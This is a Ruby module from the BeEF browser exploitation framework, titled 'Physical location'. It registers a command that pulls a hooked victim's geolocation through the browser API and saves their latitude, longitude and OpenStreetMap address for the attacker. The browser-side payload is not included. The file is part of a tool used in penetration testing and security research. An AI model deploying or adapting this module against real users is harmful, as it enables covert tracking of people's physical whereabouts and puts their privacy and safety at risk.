#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Physical_location < BeEF::Core::Command

  def initialize
    super({
      'Name' => 'Physical location',
      'Description' => %Q{
        This module will retrieve the physical location of the victim using the geolocation API
        },
      'Category' => 'Host',
      'Author' => ['antisnatchor'],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_USER_NOTIFY, 
      'browser_name' =>     ALL
    })

    use 'beef.geolocation'
    use_template!
  end

  def callback
    content = {}
    content['Geolocation Enabled'] = @datastore['geoLocEnabled']
    content['Latitude'] = @datastore['latitude']
    content['Longitude'] = @datastore['longitude']
    content['OSM address'] = @datastore['osm']
    save content
  end

end